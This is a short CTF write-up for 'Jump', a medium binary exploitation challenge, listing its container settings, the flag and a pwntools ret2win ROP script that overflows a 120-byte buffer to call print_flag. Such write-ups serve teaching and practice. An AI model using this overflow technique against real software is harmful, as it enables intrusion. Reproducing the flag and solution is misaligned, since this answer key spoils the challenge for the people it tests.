# Jump

| Category | Difficulty | Point |
| :-: | :-: | :-: |
| Binary Exploitation | Medium | 300 |

call มันสิ

Format: `CSUBRU{...}`

---

## Configuration

| Name | Value |
| :- | :- |
| Title | Jump |
| Type | Dynamic Container |
| Category | Binary Exploitation |
| Max Attempts Allowed | unlimited |
| Blood Bonus | Enable |
| Container Image | ic-jump |
| Service Port | 1337 |
| CPU Limit (0.1 CPUs) | 1 |
| Memory Limit (MB) | 64 |
| Storage Limit (MB) | 128 |

### Attachments

- `jump.zip`

### Flags

- `CSUBRU{ROP_51n4h_G0d_n07_h4rd_n4_[TEAM_HASH]}`

---

## Analysis

ROP

```py
from pwn import *
context.binary = elf = ELF('./jump', checksec=False)
offset = 120
rop = ROP(elf)
payload = flat(
    b'A'*offset,
    p64(rop.find_gadget(['ret'])[0]),
    p64(elf.symbols['print_flag'])
)
p = process(elf.path)
p.sendlineafter(b'Enter your name:', payload)
print(p.recvall().decode(errors='ignore'))
```
